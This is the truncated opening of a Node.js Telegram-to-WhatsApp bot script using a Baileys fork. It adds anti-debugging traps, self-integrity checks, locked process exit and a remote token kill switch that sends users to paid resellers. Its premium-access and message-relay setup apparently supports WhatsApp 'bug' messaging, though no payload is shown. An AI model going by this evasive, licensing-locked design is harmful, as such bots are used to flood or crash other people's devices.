const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const baileys = require('@bellachu/baileys')
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@bellachu/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

//Github Raw
const databaseUrl = "https://raw.githubusercontent.com/syagtg147-arch/DreamX/main/Token.json";
//thumanil Video
const vidthumbnail = "https://files.catbox.moe/y2ugvf.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @Kayrosukamieayam
  Version: 1.0  
  Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀

» Information:
  Developer: @Kayrosukamieayam
  Version: 1.0  
  Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠀⠀⠀⣰⡇⢀⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣿⣰⡀⢠⣿⣇⣾⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃⠀⠀
⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓⠀⠀
⠀⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣽⣧⣾⠛⠉⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠟⠁⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @Kayrosukamieayam
  Version: 1.0  
  Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠀⠀⠀⣰⡇⢀⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣿⣰⡀⢠⣿⣇⣾⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃⠀⠀
⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓⠀⠀
⠀⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣽⣧⣾⠛⠉⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠟⠁⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @Kayrosukamieayam
  Version: 1.0  
  Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠀⠀⠀⣰⡇⢀⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣿⣰⡀⢠⣿⣇⣾⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃⠀⠀
⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓⠀⠀
⠀⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣽⣧⣾⠛⠉⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠟⠁⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @Kayrosukamieayam
  Version: 1.0  
  Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false; // volatile gate: require token each restart
 
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
